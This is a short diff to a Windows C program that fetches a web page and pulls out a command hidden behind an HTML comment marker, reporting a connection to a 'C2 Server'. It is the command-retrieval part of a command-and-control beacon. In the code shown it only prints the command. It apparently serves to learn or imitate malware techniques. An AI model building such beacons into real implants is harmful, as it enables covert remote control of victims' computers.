@@ -15,6 +15,8 @@ int main(int argc, CHAR* argv[]) {
 	HANDLE HUrl;
 	LPVOID Buffer = malloc(LIMIT);
 	LPVOID Buffer1 = malloc(LIMIT);
+	LPTSTR LPCommand;
+	TCHAR* LPCommandSign = "<!--";
 	DWORD DWByteReaded;
 	if (InternetGetConnectedState(&InternetConnection, 0)) {
 		printf("Success: Internet Connection\n");
@@ -40,14 +42,12 @@ int main(int argc, CHAR* argv[]) {
 		InternetCloseHandle(HUrl);
 		exit(EXIT_FAILURE);
 	}
-	if (((*(LPTSTR)Buffer) == '<') & ((*(LPTSTR) Buffer+1) == '!') & ((*(LPTSTR) Buffer+2) == '-') & ((*(LPTSTR)Buffer+3) == '-')) {
-		LPTSTR LPCommand = (LPTSTR)Buffer + 4;
-	}
-	else {
-		printf("Failure to get command\n");
-		InternetCloseHandle(HInternet);
-		InternetCloseHandle(HUrl);
-		exit(EXIT_FAILURE);
+	printf("%s\n", Buffer);
+	printf("****************************************\n");
+	printf("Checking the command..........\n");
+	LPCommand = _tcsstr(Buffer, LPCommandSign);
+	if (LPCommand != NULL) {
+		printf("Succesful Connect to C2 Server. Here is the command: %s\n", LPCommand);
 	}
 	InternetCloseHandle(HInternet);
 	InternetCloseHandle(HUrl);
